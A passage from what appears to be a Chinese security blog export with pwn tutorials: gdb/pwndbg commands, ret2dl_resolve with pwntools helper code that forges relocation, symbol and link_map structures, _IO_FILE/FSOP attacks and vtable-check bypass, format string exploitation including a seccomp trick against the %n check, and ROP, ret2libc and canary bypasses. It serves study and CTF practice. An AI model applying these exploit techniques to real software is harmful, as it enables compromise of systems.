expr(p):expr可以是任何当前程序的有效表达式. display expr:在每次单步进行指令后输出被设置的表达式及值. watch expr:设置监视点,一旦被监视的expr的值改变,gdb将强行终止正在被调试的程序. whatis:查询变量或函数. info func:查询函数. i(info) frame:显示函数堆栈帧信息. info locals:显示当前堆栈页的所有变量. where/bt:当前堆栈列表. frame n:选择函数堆栈帧. bt backtrace:显示当前调用堆栈. up/down:向上或向下切换函数堆栈帧. info functions:列出可执行文件的所有函数名称,支持正则表达式,如info functions thre*. 窗口指令 layout src:显示源代码窗口. layout asm:显示反汇编窗口. layout split:显示源代码和反汇编窗口. layout regs:显示源代码/反汇编和CPU寄存器窗口. Ctrl + L:刷新窗口. 功能指令 set args:指定运行时的参数. show args:查看设置好的参数. info program:查看程序的是否运行,进程号,被暂停的原因. info registers:查看寄存器数值. call func(args):调用程序中可见的函数,等同于print func(args). x/(n)xg addr:从addr开始,以8字节为单位输出内存内容. x/(n)xw addr:同上,4字节. x/s:当作ascii字符串输出,x/ws打印四字节宽字符字符串,x/hs打印两字节宽字符字符串,使用p sizeof(wchar_t)查看平台宽字符字节大小. x/(n)i:反汇编操作. set var variable = expr:有源代码时使用,设置变量值,也可以用于设置寄存器值,set var $eax = 8. set {type}address = expr:任意时间使用,类似指针,set {int}0x8047a54 = 8,set {char [4]} 0x80477a4 = "Ace". quit(q):退出. pwndbg vmmap:显示虚拟内存空间排布. heap:以chunk的形式显示主分配区heap. parseheap:显示堆状况. bin:显示bin列表. elfheader:查看elf文件中各个段的起始地址. search:可以查找内存中的字符串. canary:可以查看canary的值.]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-ret2dl_resolve]]></title>
    <url>%2Fposts%2F94e4cc78%2F</url>
    <content type="text"><![CDATA[动态链接数据基础 程序分为静态链接跟动态链接,在处理动态链接程序时会采取延迟绑定(lazy binding)的技术.即位于动态链接库的函数被调用时才会确定函数在进程中的位置. 下面用一个x86程序分析. 123456789101112131415161718w4rd3n@cws:~/temp$ readelf -S pwn共有 31 个节头，从偏移量 0x17f0 开始：节头： [Nr] Name Type Addr Off Size ES Flg Lk Inf Al ... [ 5] .dynsym DYNSYM 080481cc 0001cc 000050 10 A 6 1 4 #动态链接符号表 [ 6] .dynstr STRTAB 0804821c 00021c 00004a 00 A 0 0 1 #动态链接的字符串 ... [ 9] .rel.dyn REL 08048290 000290 000008 08 A 5 0 4 #用于对数据引用的修正,修正的位置位于.got和数据段 [10] .rel.plt REL 08048298 000298 000010 08 AI 5 24 4 #用于对函数引用的修正,修正的位置位于.got.plt ... [12] .plt PROGBITS 080482d0 0002d0 000030 04 AX 0 0 16 #全局函数plt表,用于跳转,第一项用于解析函数地址 ... [22] .dynamic DYNAMIC 08049f14 000f14 0000e8 08 WA 6 0 4 #动态链接信息 [23] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4 #全局变量偏移表 [24] .got.plt PROGBITS 0804a000 001000 000014 04 WA 0 0 4 #全局函数偏移表 ... 其中.got.plt前三项不是全局函数偏移. .dynamic基址. link_map结构体指针. dl_runtime_resolve函数指针. 动态段信息. 123456789101112131415161718w4rd3n@cws:~/temp$ readelf -d pwnDynamic section at offset 0xf14 contains 24 entries: 标记 类型 名称/值 ... 0x00000005 (STRTAB) 0x804821c 0x00000006 (SYMTAB) 0x80481cc 0x0000000a (STRSZ) 74 (bytes) 0x0000000b (SYMENT) 16 (bytes) ... 0x00000003 (PLTGOT) 0x804a000 0x00000002 (PLTRELSZ) 16 (bytes) 0x00000014 (PLTREL) REL 0x00000017 (JMPREL) 0x8048298 0x00000011 (REL) 0x8048290 0x00000012 (RELSZ) 8 (bytes) 0x00000013 (RELENT) 8 (bytes) ... 重定位节信息. 1234567891011w4rd3n@cws:~/temp$ readelf -r pwn重定位节 '.rel.dyn' 位于偏移量 0x290 含有 1 个条目： 偏移量 信息 类型 符号值 符号名称08049ffc 00000206 R_386_GLOB_DAT 00000000 __gmon_start__重定位节 '.rel.plt' 位于偏移量 0x298 含有 2 个条目： 偏移量 信息 类型 符号值 符号名称0804a00c 00000107 R_386_JUMP_SLOT 00000000 read@GLIBC_2.00804a010 00000307 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0#偏移量就是对应.plt.got的地址. 动态链接符号表信息. 12345678910w4rd3n@cws:~/temp$ readelf -s pwnSymbol table '.dynsym' contains 5 entries: Num: Value Size Type Bind Vis Ndx Name 0: 00000000 0 NOTYPE LOCAL DEFAULT UND 1: 00000000 0 FUNC GLOBAL DEFAULT UND read@GLIBC_2.0 (2) ...Symbol table '.symtab' contains 70 entries:#.symtab包含大量linker,debugger需要的数据;.dynsym包含.symtab的一个子集,比如共享库需要的动态链接加载的函数对应的symbols. 符号对应的符号表信息.dynsym[num]中的num是通过((r_info)&gt;&gt;8)索引的,r_info为.rel.plt或.rel.dyn中的信息项的值. 例如:.dynsym的地址为0x80481cc,read函数对应的num为1,查看一下ndx name为read处的内存. 动态链接函数执行流程 以read函数为例.read函数内容为. read第一次调用时0x804a00c(对应的.got.plt表项)的值为read@plt + 6的地址. 跳转后先将0×0压栈(即相对.rel.plt的偏移,因为read在.rel.plt中时第一个,所以偏移为0),又跳转到0x80482d0. 0x804a004为一个指向内部link_map结构的指针,在动态装载器内部使用. 0x804a008处为函数dl_runtime_resolve(struct link_map *l, ElfW(Word) rel_offset).即调用函数dl_runtime_resolve(link_map, 0×0),解析出地址,然后写到对应.got.plt并跳转执行. dl_runtime_resolve调用_dl_fixup函数实现具体逻辑,最后解析出来的函数地址保存在rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);. 利用 如果伪造rel_offset及对应的其他结构体,便可以执行任意函数.具体参考_dl_fixup源码. 如果.dynamic可写,将.dynstr地址改写为.bss地址,然后在bss段伪造目标函数的字符串.(偏移0x44).dynamic不可写,可以将传入的rel_offset改为目标函数的偏移. 但是.rel.plt中不一定存在目标函数,可以将rel_offset修改为一个比较大的值,在可控的.rel.plt + rel_offset处伪造一个Elf32_Rel结构. 由RELENT可知,.rel.plt项大小为8字节.结构体定义如下. 12345678910111213141516171819typedef struct &#123; Elf32_Addr r_offset; Elf32_Word r_info;&#125; Elf32_Rel;#define ELF32_R_SYM(info) ((info)&gt;&gt;8)#define ELF32_R_TYPE(info) ((unsigned char)(info))#define ELF32_R_INFO(sym, type) (((sym)&lt;&lt;8)+(unsigned char)(type))//...typedef struct &#123; Elf32_Word st_name; //如果此值为0,那么此符号无名字. Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; unsigned char st_other; Elf32_Half st_shndx;&#125; Elf32_Sym; 程序根据r_info找到对应结构体.dynsym[num],伪造Elf32_Sym -&gt; st_name,使.dynstr + st_name可控,放置目标函数字符串即可. 但这里存在一个问题,index过大会导致ndx过大从而导致段错误. 12345const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;version = &amp;l-&gt;l_versions[ndx];if (version-&gt;hash == 0) version = NULL; 这个问题x86和x86-64有不同解决方案. x86 x86通过可以通过构造ndx为0来绕过. 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *def ret2dl_resolve_x86(path, stage, func, resolve_target): elf = ELF(path) plt0 = elf.get_section_by_name('.plt').header.sh_addr jmprel = elf.dynamic_value_by_tag("DT_JMPREL")#rel_plt relent = elf.dynamic_value_by_tag("DT_RELENT")#size of jmprel struct symtab = elf.dynamic_value_by_tag("DT_SYMTAB")#dynsym syment = elf.dynamic_value_by_tag("DT_SYMENT")#size of symtab strtab = elf.dynamic_value_by_tag("DT_STRTAB")#dynstr versym = elf.dynamic_value_by_tag("DT_VERSYM")#version padlen = syment - ((stage - symtab) % syment) fake_addr_sym = stage + padlen fake_symbol_index = (fake_addr_sym - symtab) / syment while True: ndx = u16(elf.read(versym + fake_symbol_index * 2, 2)) if ndx != 0: fake_symbol_index += 1 continue else: break fake_addr_sym = symtab + fake_symbol_index * syment sym_padlen = fake_addr_sym - stage stage = fake_addr_sym + syment padlen = relent - ((stage - jmprel) % relent) fake_addr_reloc = stage + padlen padlen_reloc = padlen fake_addr_symstr = fake_addr_reloc + relent r_info = (((fake_addr_sym - symtab) / syment) &lt;&lt; 8) | 0x7 fake_st_name = fake_addr_symstr - strtab resolve_data = "S" * sym_padlen resolve_data += struct.pack('&lt;IIII', fake_st_name, 0, 0, 0x12)#Elf32_Sym resolve_data += "S" * padlen_reloc resolve_data += struct.pack('&lt;II', resolve_target, r_info)#Elf32_Rel resolve_data += func fake_reloc_offset = fake_addr_reloc - jmprel resovle_call = p32(plt0) + p32(fake_reloc_offset) return resolve_data, resovle_call x86-64 基本原理与32bit相同.只是一些结构体发生变化,参数传递方式也不一样.然后绕过version方式变成了使link_map + 0x1c8为NULL. 123456789101112131415161718192021222324252627282930313233343536373839#https://github.com/inaz2/roputils/blob/master/roputils.pydef dl_resolve_data(self, base, name): jmprel = self.dynamic('JMPREL') relaent = self.dynamic('RELAENT') symtab = self.dynamic('SYMTAB') syment = self.dynamic('SYMENT') strtab = self.dynamic('STRTAB') addr_reloc, padlen_reloc = self.align(base, jmprel, relaent) addr_sym, padlen_sym = self.align(addr_reloc + relaent, symtab, syment) addr_symstr = addr_sym + syment r_info = (((addr_sym - symtab) / syment) &lt;&lt; 32) | 0x7 st_name = addr_symstr - strtab buf = self.fill(padlen_reloc) buf += struct.pack('&lt;QQQ', base, r_info, 0) buf += self.fill(padlen_sym) buf += struct.pack('&lt;IIQQ', st_name, 0x12, 0, 0) buf += self.string(name) return bufdef dl_resolve_call(self, base, *args): #覆盖link_map + 0x1c8为NULL #参数自行设置 if args: raise Exception('arguments must be set to the registers beforehand') jmprel = self.dynamic('JMPREL') relaent = self.dynamic('RELAENT') addr_reloc, padlen_reloc = self.align(base, jmprel, relaent) reloc_offset = (addr_reloc - jmprel) / relaent buf = self.p(self.plt()) buf += self.p(reloc_offset) return buf 但这种利用需要泄露,所以不太实用. 查看_dl_fixup源码可发现,当对应的.dynsym节中Elf32_Sym结构的st_other值为非0时,会进入另一个分支. 1234567#define DL_FIXUP_MAKE_VALUE(map, addr) (addr)if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123; /* code */&#125; else &#123; value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value); result = l;&#125; sym和l都由传入的link_map结构体指针决定,可以伪造link_map结构,使l-&gt;l_addr和sym-&gt;st_value两个变量一个为某个已解析的GOT表条目,另一个为需要的偏移,就能获得任意libc地址. 123456789101112131415161718192021pwndbg&gt; ptype ltype = struct link_map &#123; Elf64_Addr l_addr; char *l_name; Elf64_Dyn *l_ld; struct link_map *l_next; struct link_map *l_prev; struct link_map *l_real; Lmid_t l_ns; struct libname_list *l_libname; Elf64_Dyn *l_info[76]; //l_info 里面包含的就是动态链接的各个表的信息 #... size_t l_tls_firstbyte_offset; ptrdiff_t l_tls_offset; size_t l_tls_modid; size_t l_tls_dtor_count; Elf64_Addr l_relro_addr; size_t l_relro_size; unsigned long long l_serial; struct auditstate l_audit[];&#125; * l_addr可以直接设置为偏移.所以需要使sym-&gt;st_value为某个已解析的GOT表条目. 12345678#define DT_SYMTAB 6//获取符号表地址const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);//获取函数对应的重定位表结构地址const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);//获取函数对应的符号表结构地址const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]; 可以控制reloc-&gt;r_info为0,这样就是&amp;symtab[ELFW(R_SYM) (0)]. 又因为symtab为l_info[6],所以可以控制symtab[0]. 12345678910111213141516171819202122from pwn import *def ret2dl_resolve_x64(stage, reloc_index, offset, got_libc): fake_link_map = p64(offset)#l-&gt;l_addr fake_link_map = fake_link_map.ljust(0x10,'\x00') fake_link_map = fake_link_map.ljust(0x30,'\x00') target_write = stage + 0x28 fake_jmprel = p64(target_write - offset) fake_jmprel += p64(7) fake_jmprel += p64(0) fake_link_map += fake_jmprel fake_link_map = fake_link_map.ljust(0x68,'\x00') fake_link_map += p64(stage)#DT_STRTAB fake_link_map += p64(stage + 0x78 - 8)#fake_DT_SYMTAB fake_link_map += p64(got_libc - 8)#st-&gt;other != 0, st-&gt;st_value = libc fake_link_map += p64(stage + 0x30 - 0x18 * reloc_index)#fake_reloc fake_link_map = fake_link_map.ljust(0xf8,'\x00') fake_link_map += p64(stage + 0x80 - 8)#fake_DT_JMPREL return fake_link_map 还有种思路是控制l_addr刚好落在已存在的libc地址上,构造思路同上.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-IO_FILE分析与利用]]></title>
    <url>%2Fposts%2F66ff017b%2F</url>
    <content type="text"><![CDATA[概念 glibc利用_IO_FILE结构实现了文件流,是基本文件描述符的高级接口,支持流缓冲. _IO_FILE结构通过fopen打开文件获得,fopen首先在堆中分配一片区域存放文件结构体,然后对结构体初始化并链接到以一个_IO_FILE_plus链表中,最后打开文件. 可以通过攻击原有的stdout等_IO_FILE结构体或者覆盖_IO_FILE指针指向伪造的_IO_FILE从而利用结构中一个叫做vtable的指针来执行任意代码. 也可以覆盖stdout泄露libc基址. 源码分析 glibc 2.23中对应结构体名称是_IO_FILE_plus,包含了一个_IO_FILE结构体和一个_IO_jump_t结构体指针vtable(_IO_FILE_plus和_IO_jump_t定义于libio/libioP.h,_IO_FILE定义于libio/libio.h). vtable是一种兼容C++虚函数的实现.当对流进行函数调用时,会调用该流跳转表中对应的函数. 1234567891011121314151617181920212223//libio/libioP.hstruct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); //more JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;;struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;;extern struct _IO_FILE_plus *_IO_list_all; _IO_FILE成员变量对应偏移. 12345678910111213141516171819202122232425262728293031323334350x0 _flags0x8 _IO_read_ptr0x10 _IO_read_end0x18 _IO_read_base#read buf0x20 _IO_write_base0x28 _IO_write_ptr0x30 _IO_write_end#write buf0x38 _IO_buf_base0x40 _IO_buf_end#reserve buf0x48 _IO_save_base0x50 _IO_backup_base0x58 _IO_save_end0x60 _markers0x68 _chain#文件结构体指针链表0x70 _fileno#文件描述符0x74 _flags20x78 _old_offset0x80 _cur_column0x82 _vtable_offset0x83 _shortbuf0x88 _lock0x90 _offset0x98 _codecvt0xa0 _wide_data0xa8 _freeres_list0xb0 _freeres_buf0xb8 __pad50xc0 _mode0xc4 _unused20xd8 vtable 进程中的_IO_FILE_plus结构体会通过_chain构成一个链表,链表头部为全局变量_IO_list_all. FSOP FSOP(File Stream Oriented Programming)的核心思想就是劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项(当然也可以直接覆盖bss段的指针或者覆盖原有结构体). 通过调用_IO_flush_all_lockp函数触发,该函数会刷新_IO_list_all链表中所有项的文件流,相当于对每个FILE调用fflush,也对应着会调用_IO_FILE_plus.vtable中的_IO_overflow. _IO_flush_all_lockp不需要攻击者手动调用，在一些情况下这个函数会被系统调用. libc执行abort流程时(malloc_printerr). 执行exit函数时. 执行流从main函数返回时. libc-2.24防御与bypass 在libc-2.24中加入了对vtable指针的检查.新增了两个函数:IO_validate_vtable(libio/libioP.h)和_IO_vtable_check(libio/vtables.c). 所有的libio vtables被放进了专用的只读的__libc_IO_vtables段,以使它们在内存中连续.在任何间接跳转之前,vtable指针将根据段边界进行检查,如果指针不在这个段,则调用函数_IO_vtable_check()做进一步的检查,并且在必要时终止进程. 由于无法伪造虚表,只能在__libc_IO_vtables段里面找可利用的vtable. 比如_IO_str_jumps(libio/strops.c). 1234567const struct _IO_jump_t _IO_str_jumps =&#123; JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_str_finish), JUMP_INIT(overflow, _IO_str_overflow), //more&#125;; 其中_IO_str_overflow函数如下. 1234567891011121314151617181920212223242526272829303132333435int _IO_str_overflow (_IO_FILE *fp, int c)&#123; int flush_only = c == EOF; _IO_size_t pos; if (fp-&gt;_flags &amp; _IO_NO_WRITES) return flush_only ? 0 : EOF; if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) &#123; fp-&gt;_flags |= _IO_CURRENTLY_PUTTING; fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end; &#125; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base; if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)) //#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) &#123; if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */ return EOF; else &#123; char *new_buf; char *old_buf = fp-&gt;_IO_buf_base; size_t old_blen = _IO_blen (fp); _IO_size_t new_size = 2 * old_blen + 100; if (new_size &lt; old_blen) return EOF; new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); //对应指针和参数都可控 ... &#125; ... &#125; ...&#125; _IO_strfile定义. 1234567891011121314151617struct _IO_str_fields&#123; _IO_alloc_type _allocate_buffer; _IO_free_type _free_buffer; &#125;;struct _IO_streambuf&#123; struct _IO_FILE _f; const struct _IO_jump_t *vtable;&#125;;typedef struct _IO_strfile_&#123; struct _IO_streambuf _sbf; struct _IO_str_fields _s;&#125; _IO_strfile; bypass条件与利用. fp-&gt;_flags &amp; _IO_NO_WRITES为假. fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假. 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100不能为负数. new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100,这里控制rdi. fp + 0xe0指向需要劫持到的函数. 完整的调用过程:malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __GI__IO_str_overflow.其他利用类似. 任意地址读写 IO函数会通过文件结构体的以下指针来读写数据,通过覆盖原有的stdout等结构体指针就可以任意地址读写(或者伪造一个一样的). 1234567891011char* _IO_read_ptr;char* _IO_read_end;char* _IO_read_base;//readchar* _IO_write_base;char* _IO_write_ptr;char* _IO_write_end;//writechar* _IO_buf_base;char* _IO_buf_end;//buf scanf读取输入会先放到_IO_buf_base缓冲区中,劫持该指针可以任意写,其他IO函数同理.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-格式化字符串漏洞]]></title>
    <url>%2Fposts%2Fe9037fb1%2F</url>
    <content type="text"><![CDATA[概念 格式化字符串漏洞:当printf等格式化字符串函数的第一个参数用户可控时,即可任意读写. 原理 格式化字符串的格式如下. 1%[parameter][flags][width][.precision][length]type parameter:n$,使用第n个参数. flags:在width设置后指定可以用来作为填充的内容之类的内容. width:最小输出长度. precision:最大输出长度. length:参数长度,h,ll.配合type. 其中type即相应变量的类型. d/i,有符号整数. u,无符号整数. x/X,16进制unsigned int.(如果指定了精度,则输出的数字不足时在左侧补0.默认精度1.精度为0且值为0,则输出为空.) o,8进制unsigned int.(如果指定了精度,则输出的数字不足时在左侧补0.默认精度1.精度为0且值为0,则输出为空.) s,如果没有用l标志,输出字符串直到精度规定的上限.用了l标志表示函数参数指向wchar_t型的数组,输出时把每个宽字符转化为多字节字符,相当于调用wcrtomb函数. c,如果没有用l标志,把int参数转为unsigned char型输出(参数传递时char会被隐式转化为int);如果用了l标志,把wint_t参数转为包含两个元素的wchart_t数组,其中第一个元素包含要输出的字符,第二个元素为null宽字符. C,ISO宽字符. p,void *型,用地址的格式输出对应变量的值. n,不输出字符,但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量,printf超过0x2000个字节之后%n会写不了值.(格式化字符串漏洞任意写) %,'%'字面值. f,输出十进制记数法float变量. e/E,输出科学记数法double变量. a/A,输出十六进制记数法double变量(C99). 常用%p,%x,%n,%s搭配其他限定符读写数据. 利用 这里分两种情况. 第一种是格式化字符串在调用的格式化字符串函数的栈帧之上(即可以作为格式化控制符解析参数),这种情况基本上可以测出偏移后利用%num$x,%num$n任意读任意写. 第二种是格式化字符串不可作为解析参数.就只能利用栈上的参数进行读写. fprintf_chk &amp; 沙箱逃逸 fprintf_chk执行%n会报错. 1*** %n in writable segment detected *** 检测逻辑(glibc2.23). 123456789LABEL (form_number): if (s-&gt;_flags2 &amp; _IO_FLAGS2_FORTIFY) &#123; if (! readonly_format) &#123; extern int __readonly_area (const void *, size_t) attribute_hidden; readonly_format = __readonly_area (format, ((STR_LEN (format) + 1) * sizeof (CHAR_T))); &#125; if (readonly_format &lt; 0) __libc_fatal ("*** %n in writable segment detected ***\n"); &#125; __readonly_area通过fopen打开/proc/self/maps,来判断format是否是只读段. 结构体__IO_FILE利用_fileno来判定是哪个文件. 12345678910111213141516171819202122232425_IO_FILE * _IO_file_open (_IO_FILE *fp, const char *filename, int posix_mode, int prot, int read_write, int is32not64) &#123; int fdesc;#ifdef _LIBC if (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL)) fdesc = open_not_cancel (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot); else fdesc = open (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);#else fdesc = open (filename, posix_mode, prot);#endif if (fdesc &lt; 0) return NULL; fp-&gt;_fileno = fdesc; _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING); if ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS)) == (_IO_IS_APPENDING | _IO_NO_READS)) &#123; _IO_off64_t new_pos = _IO_SYSSEEK (fp, 0, _IO_seek_end); if (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE) &#123; close_not_cancel (fdesc); return NULL; &#125; &#125; _IO_link_in ((struct _IO_FILE_plus *) fp); return fp;&#125;libc_hidden_def (_IO_file_open) 而stdin._fileno = 0,所以可以控制seccomp让fopen("/proc/self/maps")返回ERROR,此时,open的返回值为0,此时fopen认为其fileno是0,程序会从STDIN中读取数据,进行判断. 此时只需要输入000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n即可绕过%n检测.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-栈溢出概览]]></title>
    <url>%2Fposts%2Feb1fae06%2F</url>
    <content type="text"><![CDATA[概念 栈溢出指由于程序使用了不安全的函数或逻辑错误,导致攻击者溢出栈中缓冲区破坏(篡改)其他数据. 可以看到在栈中,位于局部变量(溢出点)后面的有:部分其他局部变量,返回地址,和所有的之前的栈帧. 栈溢出可以让攻击者劫持PC register(eip/rip). 有时候要劫持ebp(即被保存的栈指针)来控制栈的位置从而劫持控制流或者调用函数的局部变量值(因为局部变量一般使用ebp相对偏移). 利用方法 在Intel体系中,内存空间中的数据被权限分为code(rx)和data(rw)(如果没有的权限的话这两者就没有本质上的区别). 可执行的代码有两种,进程内存空间本身的代码(包括程序代码,动态库代码,甚至错误偏移产生的代码等等)和攻击者写进去的shellcode(如果程序没有开启DEP,也就是NX). 利用前者的方法也叫做面向返回编程(Return-Oriented Programming,缩写:ROP). 即攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列(称为gadget).gadget通常结束于ret指令.对于动态库代码中的gadget需要先泄露libc基址(绕过ASLR). 12ROPgadget --binary [fileName] | grep "pop rdi"ROPgadget --binary [fileName] --string /bin/sh 根据不同的程序保护机制,要采用不同的漏洞利用方法.(ASLR基本都是默认开启) Return-2-Shellcode 如果程序未开启NX,可以直接写shellcode到栈(或者堆,bss等可控区域)上,如果能泄露对应地址(通过缓冲区泄露)就可以通过偏移直接ret到shellcode上,或者寻找jmp esp(32位)这种gadget控制PC register(eip/rip)到栈上. Return-2-libc 其实就是指利用libc中的函数来获取shell,最典型的就是system("/bin/sh");.这个可以用来绕过DEP. 这种利用的前提是已经泄露了一个libc地址(如果是动态链接,静态链接直接ROP即可).这样就能绕过ASLR获得system的地址. 123libc = ELF("libc.so")off_system = libc.symbols['write'] - libc.symbols['system']system_addr = write_addr - off_system 也可以用工具获得动态库的导出函数偏移. 12nm -D libc.so | grep "system"objdump -T libc.so | grep "system" Return-2-csu 64bit要控制rdi等寄存器才能控制参数.使用工具ROPgadget --binary pwn可以找到pop rdi; ret;等gadget.其他和32bit类似. ROPgadget的--ropchain可以自动化生成ROP链(一般都用不了). /bin/sh的地址也可以用ROPgadget找到. 1ROPgadget --binary ./pwn --string /bin/sh 而实际上这就是Return-2-csu,因为libc_init_cus函数中就有控制rdi和rsi的gadget,还有组合起来可以控制rdx的gadget. 绕过PIE 泄露一个属于该可执行文件里的内容的地址从而求出基址,或者使用部分覆盖. 绕过canary 泄露,通过栈泄露或者格式化字符串等方式. 对于有fork的进程,子进程canary值是一样的,就可以逐位爆破. 劫持__stack_chk_fail,或者更深层的调用. __stack_chk_fail会将argv[0]输出,通过劫持这个参数泄露内容. 直接劫持控制流不进行canary检测. 栈溢出足够多的数据来复写TLS中的tcbhead_t.stack_guard的值,从而bypass canary. 在glibc2.23下mmap一个合适堆可以分配到TLS结构上方附近,再通过堆溢出即可覆盖TLS中的tcbhead_t.stack_guard的值,例如:32位下malloc(1024*130),此时堆指针到tcbhead_t.stack_guard的偏移为:0x216FC. BROP 基于没有二进制文件这种情况而产生的一系列技术. 其思路为触发漏洞后通过回显或者连接状态得出信息.常见漏洞有栈溢出和格式化字符串漏洞. 格式化字符串漏洞发现后即可泄露栈上数据并任意地址读写. 主要研究栈溢出漏洞. 如果存在栈溢出的函数调用后还有输出或者其他操作,可以通过递增输入长度得到返回地址的偏移. 知道返回地址偏移后就可以通过测试不同的gadget得出一些有用的gadget. 最重要的是stop gadget,即不会使程序crash且有一定特征的gadget.可以利用这种gadget去寻找需要的gadget. stack pivot 需要存在类似pop esp; ret;等栈迁移gadget,作用是将栈迁移到可控区域从而使第二次ROP链的内容更可控. 其他 具体环境不同设计,重要就是找到可写区域,可读区域和可执行区域然后通过构造ROP链等操作获得shell. vdso &amp; vsyscall vdso(Virtual Dynamic Shared Object,虚拟动态共享对象)是指内核和用户空间共享的代码空间,动态分配,地址随机(栈上的环境变量中存在这个地址),提供超过4个系统调用,由glibc库提供功能. 12dumpmem vdso.so 0x00007ffff7ffd000 ​0x00007ffff7fff000#vdso映射的是一整个ELF文件 由于使用int 0x80进行系统调用效率低,Intel和AMD分别实现了sysenter/sysexit和syscall/sysret(快速系统调用指令). 为了兼容这两种快速系统调用指令和未实现快速系统调用指令的CPU,Linux实现了vsyscall,程序调用vsyscall,具体的选择由内核来决定. 而vsyscall的实现就在vdso中.vsyscall在每个进程中静态分配在相同的地址,只允许4个系统调用,gettimeofday,time和getcpu.由内核提供功能. x86_64从AMD引进了syscall指令,但是vdso,vsyscall的机制依旧未变. vsyscall执行时会进行检查,如果不是从函数开头执行的话就会出错,所以一般只能用于平滑跳转,类似于shellcode中nop的作用 .vdso常用于寻找系统调用指令或者搭配srop,x86环境下vdso只有一字节是random,也就是1/256的命中率,范围为0xf7700000 ~ 0xf7800000.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-基础]]></title>
    <url>%2Fposts%2Fd1f521aa%2F</url>
    <content type="text"><![CDATA[概述 漏洞是在硬件,软件,协议的具体实现或系统安全策略上存在的缺陷,从而可以使攻击者能够在未授权的情况下访问或破坏系统.二进制漏洞就是指机器代码层面的漏洞. pwn即二进制漏洞利用,通过漏洞来提升权限或得到shell或达到某种目的. Linux进程内存布局 Linux系统在装载elf格式的程序文件时,会调用loader把可执行文件中的各个段依次载入到从某一地址开始的空间中,载入地址取决link editor(ld)和机器地址位数. 32位进程内存经典布局. 64与之类似.除了载入位置外最大的不同就是Memory Mapping Segment生长的方向不一样. 内核数据结构mm_struct的成员变量start_code和end_code是进程代码段的起始和终止地址,start_data和end_data是进程数据段的起始和终止地址,start_stack是进程堆栈段起始地址,start_brk和brk是进程主分配区中heap的起始和终止地址. 当ELF文件比较小的时候,不同区段可能会被多次映射. 预备知识 前期主要为:x86/x86-64架构下Linux平台的C语言,汇编语言,python(写利用脚本),Linux常用操作,操作系统原理. 不同CPU架构下的Linux在利用上区别大多体现在汇编语言(严格说是ISA)层面. 常见二进制漏洞 非法写 常见的有堆溢出,栈溢出和数据段溢出. 比如gets函数:从stdio流中读取字符串,直至接受到换行符或EOF时停止,并将读取的结果存放在buffer指针所指向的内存(字符指针)中.换行符不作为读取串的内容,读取的换行符被转换为'\0'空字符. 然而函数的设计者没有考虑如果输入的内容超过字符数组的长度会怎么样. 